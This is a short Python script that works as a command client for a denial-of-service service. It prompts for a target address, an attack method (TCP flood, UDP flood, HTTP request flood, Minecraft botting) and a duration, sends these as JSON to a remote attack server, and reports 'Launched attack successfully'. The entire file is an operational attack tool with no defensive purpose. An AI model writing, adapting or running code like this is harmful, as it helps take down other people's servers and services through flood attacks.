import requests, os

target_msg        = 'Please enter the ip:port ( http(s)://yoururl.com if HTTP Requests) of the target >> '
time_msg          = 'Please enter for how many seconds you want the attack to stay >> '
attack_method_msg = 'Enter your attack method >> '
server_url        = 'http://yourserver:69'

attack_mode = '''
[1] TCP Flood           |
[2] TCP Overload        |
[3] UDP Flood           |
[4] HTTP Requests       |
[5] Minecraft Botting   | 
''' # Change the attack methods to the one you support

try:
    while True:
        os.system('cls')
        target = input(target_msg)

        print(attack_mode)
        attack_method = input(attack_method_msg)
        try:
            time = int(input(time_msg))
        except ValueError:
            time = 60

        payload = { # PLEASE change the payload to one that your server supports
            'target': target,
            'method': attack_method,
            'time': time
        }

        req = requests.post(server_url, json=payload)

        if req.status_code in [200, 204]: # You can also check if the req.json() contains a message your server returns
            
            print('Launched attack successfully !')

            input('Press enter to continue...')
        else:
            print(f'[!] something bad happened: {req.text} - {req.status_code}')

except KeyboardInterrupt:
    print('Exiting...')
    exit()